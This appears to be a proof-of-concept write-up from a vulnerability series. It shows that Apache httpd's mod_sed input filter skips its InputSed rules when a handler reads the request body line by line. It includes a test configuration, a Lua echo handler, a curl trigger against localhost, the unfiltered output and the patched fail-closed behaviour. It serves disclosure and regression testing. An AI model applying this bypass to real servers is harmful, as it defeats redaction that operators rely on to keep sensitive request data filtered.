# PoC 117 — InputSed Filtering Bypass By Read Mode

`sed_request_filter` returned the next filter's brigade unchanged whenever
the read mode was not `AP_MODE_READBYTES`, so a downstream consumer using
`AP_MODE_GETLINE` received the *unfiltered* request body even though
`InputSed` rules were configured.

## Setup

A handler that explicitly reads the body in `AP_MODE_GETLINE`. Two easy
options: `mod_lua` (`r:requestbody()` walks getline-style), or a custom
mini-handler. We use `mod_lua` because it ships with the source tree.

`httpd.conf`:

```apache
ServerName 127.0.0.1
Listen 8080
LoadModule mpm_prefork_module    modules/mod_mpm_prefork.so
LoadModule authz_core_module     modules/mod_authz_core.so
LoadModule sed_module            modules/mod_sed.so
LoadModule lua_module            modules/mod_lua.so
LoadModule unixd_module          modules/mod_unixd.so

<Location /echo>
    SetHandler lua-script
    SetInputFilter Sed
    InputSed "s/secret/REDACTED/g"
</Location>
```

Lua handler `/tmp/htdocs/echo.lua` consuming the body line-by-line:

```lua
function handle(r)
    r.content_type = "text/plain"
    -- Lua's r:requestbody() reads via AP_MODE_GETLINE.
    local body = r:requestbody()
    r:write(body)
    return apache2.OK
end
```

(The same effect can be obtained with a four-line C handler that calls
`ap_get_brigade(f, bb, AP_MODE_GETLINE, APR_BLOCK_READ, 0)` directly.)

`httpd.conf` is extended with:

```apache
LuaMapHandler ^/echo$ /tmp/htdocs/echo.lua handle
```

## Trigger

```bash
httpd -X -f /tmp/httpd.conf &
sleep 1

# Body that contains "secret" twice.
printf 'top secret\nthe secret is here\n' \
  | curl -sv --data-binary @- \
         -H 'Content-Type: text/plain' \
         http://127.0.0.1:8080/echo
```

## Observed effect

Buggy build returns the literal body untouched:

```text
top secret
the secret is here
```

The same request to a control endpoint that uses `AP_MODE_READBYTES` (e.g. a
plain CGI / `mod_proxy_http` upstream) returns:

```text
top REDACTED
the REDACTED is here
```

confirming that the bypass is mode-dependent rather than a configuration
issue.

After the patch, the GETLINE path returns `APR_ENOTIMPL` and the request
fails closed with a 500 from the consumer rather than silently leaking the
unfiltered body.

## Marker

The buggy build returns `secret` unchanged via the GETLINE handler; the
fixed build either rewrites it (if the consumer is upgraded to READBYTES)
or returns `500`/`APR_ENOTIMPL` instead of unfiltered bytes.
